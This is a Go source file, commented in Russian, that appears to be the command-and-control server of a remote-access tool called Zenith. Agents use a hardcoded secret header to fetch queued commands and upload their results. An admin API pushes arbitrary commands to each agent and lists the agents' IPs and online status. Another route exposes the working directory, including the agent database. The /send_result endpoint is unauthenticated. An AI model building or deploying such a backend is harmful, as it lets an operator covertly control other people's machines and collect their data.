package main

import (
	"database/sql"
	"encoding/json"
	"fmt"
	"io/ioutil"
	"net/http"
	"strings"
	"sync"
	"time"

	_ "github.com/mattn/go-sqlite3"
)

// --- КОНФИГУРАЦИЯ ---
const (
	Port      = ":43445"
	AdminPass = "MY_ADMIN_PASSWORD"
	AgentCode = "COSMOS0611"
	DBFile    = "clients.db"
)

var (
	db *sql.DB
	mu sync.Mutex
)

// Структура для передачи данных в Админку
type AgentInfo struct {
	CID      string `json:"cid"`
	Name     string `json:"name"`
	IP       string `json:"ip"`
	Task     string `json:"task"`
	Result   string `json:"result"`
	LastSeen int64  `json:"last_seen"`
	Status   string `json:"status"`
}

func initDB() {
	var err error
	db, err = sql.Open("sqlite3", DBFile)
	if err != nil {
		panic(err)
	}

	// Создаем таблицу, если её нет
	query := `
	CREATE TABLE IF NOT EXISTS agents (
		cid TEXT PRIMARY KEY,
		name TEXT,
		ip TEXT,
		task TEXT DEFAULT 'none',
		result TEXT DEFAULT '',
		last_seen INTEGER
	);`
	_, err = db.Exec(query)
	if err != nil {
		panic(err)
	}
}

// Извлечение чистого IP (без порта)
func getIP(r *http.Request) string {
	ip := r.Header.Get("X-Forwarded-For")
	if ip == "" {
		ip = strings.Split(r.RemoteAddr, ":")[0]
	}
	return ip
}

func main() {
	initDB()
	defer db.Close()

	// --- МАРШРУТЫ ДЛЯ АГЕНТА ---

	http.HandleFunc("/get_task", func(w http.ResponseWriter, r *http.Request) {
		if r.Header.Get("X-Secret-Auth") != AgentCode {
			http.Error(w, "Forbidden", 403)
			return
		}

		cid := r.Header.Get("Client-ID")
		info := r.Header.Get("Client-Info")
		ip := getIP(r)
		now := time.Now().Unix()

		mu.Lock()
		// Регистрация или обновление данных агента
		_, _ = db.Exec(`
			INSERT INTO agents (cid, name, ip, last_seen) 
			VALUES (?, ?, ?, ?)
			ON CONFLICT(cid) DO UPDATE SET 
				name=excluded.name, 
				ip=excluded.ip, 
				last_seen=excluded.last_seen`,
			cid, info, ip, now)

		// Получение текущей задачи
		var task string
		_ = db.QueryRow("SELECT task FROM agents WHERE cid = ?", cid).Scan(&task)

		// Сброс задачи после выдачи
		_, _ = db.Exec("UPDATE agents SET task = 'none' WHERE cid = ?", cid)
		mu.Unlock()

		w.Write([]byte(task))
	})

	http.HandleFunc("/send_result", func(w http.ResponseWriter, r *http.Request) {
		cid := r.Header.Get("Client-ID")
		body, _ := ioutil.ReadAll(r.Body)
		result := string(body)

		mu.Lock()
		_, _ = db.Exec("UPDATE agents SET result = ? WHERE cid = ?", result, cid)
		mu.Unlock()

		fmt.Printf("[+] Result from %s updated in DB\n", cid)
		w.Write([]byte("OK"))
	})

	// --- МАРШРУТЫ ДЛЯ АДМИНКИ ---

	http.HandleFunc("/admin/list", func(w http.ResponseWriter, r *http.Request) {
		if r.Header.Get("Admin-Auth") != AdminPass {
			http.Error(w, "Unauthorized", 401)
			return
		}

		rows, _ := db.Query("SELECT cid, name, ip, task, result, last_seen FROM agents")
		defer rows.Close()

		var agents []AgentInfo
		now := time.Now().Unix()

		for rows.Next() {
			var a AgentInfo
			_ = rows.Scan(&a.CID, &a.Name, &a.IP, &a.Task, &a.Result, &a.LastSeen)

			if now-a.LastSeen < 30 {
				a.Status = "online"
			} else {
				a.Status = "offline"
			}
			agents = append(agents, a)
		}

		w.Header().Set("Content-Type", "application/json")
		json.NewEncoder(w).Encode(agents)
	})

	http.HandleFunc("/admin/push", func(w http.ResponseWriter, r *http.Request) {
		if r.Header.Get("Admin-Auth") != AdminPass {
			http.Error(w, "Unauthorized", 401)
			return
		}

		var req struct {
			CID string `json:"cid"`
			Cmd string `json:"cmd"`
		}
		_ = json.NewDecoder(r.Body).Decode(&req)

		mu.Lock()
		_, _ = db.Exec("UPDATE agents SET task = ? WHERE cid = ?", req.Cmd, req.CID)
		mu.Unlock()

		w.Write([]byte("OK"))
	})

	// Раздача файлов для просмотра медиа
	http.Handle("/admin/get_file/", http.StripPrefix("/admin/get_file/", http.FileServer(http.Dir("."))))

	fmt.Println("[*] Zenith Go-Server + SQLite started on " + Port)
	http.ListenAndServe(Port, nil)
}
